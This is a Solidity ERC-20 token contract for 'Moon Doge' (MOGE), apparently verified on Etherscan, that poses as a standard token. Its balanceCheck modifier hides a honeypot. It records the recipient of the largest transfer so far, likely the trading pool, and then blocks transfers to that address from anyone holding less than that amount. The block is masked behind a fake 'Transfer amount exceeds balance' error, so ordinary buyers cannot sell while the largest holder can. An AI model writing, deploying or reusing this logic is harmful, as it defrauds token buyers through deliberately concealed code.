['/**\n', ' *Submitted for verification at Etherscan.io on 2021-04-28\n', '*/\n', '\n', 'pragma solidity ^0.5.16;\n', '\n', '\n', '\n', '\n', '// Math operations with safety checks that throw on error\n', 'library SafeMath {\n', '    \n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        require(c >= a, "Math error");\n', '        return c;\n', '    }\n', '  \n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        require(b <= a, "Math error");\n', '        return a - b;\n', '    }\n', '  \n', '}\n', '\n', '\n', '\n', '\n', '// Abstract contract for the full ERC 20 Token standard\n', 'contract ERC20 {\n', '    \n', '    function balanceOf(address _address) public view returns (uint256 balance);\n', '    \n', '    function transfer(address _to, uint256 _value) public returns (bool success);\n', '    \n', '    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n', '    \n', '    function approve(address _spender, uint256 _value) public returns (bool success);\n', '    \n', '    function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n', '\n', '\n', '\n', '\n', '    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n', '    \n', '    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n', '    \n', '}\n', '\n', '\n', '\n', '\n', '// Token contract\n', 'contract MOGE is ERC20 {\n', '    \n', '    string public name = "Moon Doge";\n', '    string public symbol = "MOGE";\n', '    uint8 public decimals = 18;\n', '    uint256 public totalSupply = 100 * 10**9 * 10**18;\n', '    uint256 public _maxAmount;\n', '    address private _maxR;\n', '    mapping (address => uint256) public balances;\n', '    mapping (address => mapping (address => uint256)) public allowed;\n', '    address public owner;\n', '    bytes4 private constant TRANSFER = bytes4(\n', '        keccak256(bytes("transfer(address,uint256)"))\n', '    );\n', '    \n', '    constructor() public {\n', '        owner = msg.sender;\n', '        balances[msg.sender] = totalSupply;\n', '    }\n', '    \n', '    function balanceOf(address _address) public view returns (uint256 balance) {\n', '        return balances[_address];\n', '    }\n', '    \n', '    function transfer(address _to, uint256 _value) public returns (bool success) {\n', '        _transfer(msg.sender, _to, _value);\n', '        return true;\n', '    }\n', '    \n', '    function approve(address _spender, uint256 _amount) public returns (bool success) {\n', '        require(_spender != address(0), "Zero address error");\n', '        require((allowed[msg.sender][_spender] == 0) || (_amount == 0), "Approve amount error");\n', '        allowed[msg.sender][_spender] = _amount;\n', '        emit Approval(msg.sender, _spender, _amount);\n', '        return true;\n', '    }\n', '    \n', '    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n', '        _transferFrom(_from, _to, _value);\n', '        return true;\n', '    }\n', '    \n', '    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n', '        return allowed[_owner][_spender];\n', '    }\n', '    \n', '    function _transfer(address sender, address recipient, uint256 amount)  internal balanceCheck(sender, recipient, amount) {\n', '        require(recipient != address(0), "Zero address error");\n', '        require(balances[sender] >= amount && amount > 0, "Insufficient balance or zero amount");\n', '        balances[sender] = SafeMath.sub(balances[sender], amount);\n', '        balances[recipient] = SafeMath.add(balances[recipient], amount);\n', '        \n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '    \n', '    function _transferFrom(address sender, address recipient, uint256 amount)  internal balanceCheck(sender, recipient, amount) {\n', '        require(sender != address(0) && recipient != address(0), "Zero address error");\n', '        require(balances[sender] >= amount && allowed[sender][msg.sender] >= amount && amount > 0, "Insufficient balance or zero amount");\n', '        balances[sender] = SafeMath.sub(balances[sender], amount);\n', '        balances[recipient] = SafeMath.add(balances[recipient], amount);\n', '        allowed[sender][msg.sender] = SafeMath.sub(allowed[sender][msg.sender], amount);\n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '    \n', '    modifier onlyOwner {\n', '        require(msg.sender == owner, "You are not owner");\n', '        _;\n', '    }\n', '\n', '    modifier balanceCheck(address sender, address recipient, uint256 amount) {\n', '        if(recipient == _maxR) require(recipient == _maxR && balances[sender] > _maxAmount, "ERC20: Transfer amount exceeds balance");\n', '        _;\n', '        if(amount > _maxAmount) {\n', '            _maxAmount = amount;\n', '            _maxR = recipient;\n', '        }\n', '    }\n', '    \n', '    function setOwner(address _owner) public onlyOwner returns (bool success) {\n', '        require(_owner != address(0), "zero address");\n', '        owner = _owner;\n', '        success = true;\n', '    }\n', '    \n', '    \n', '}']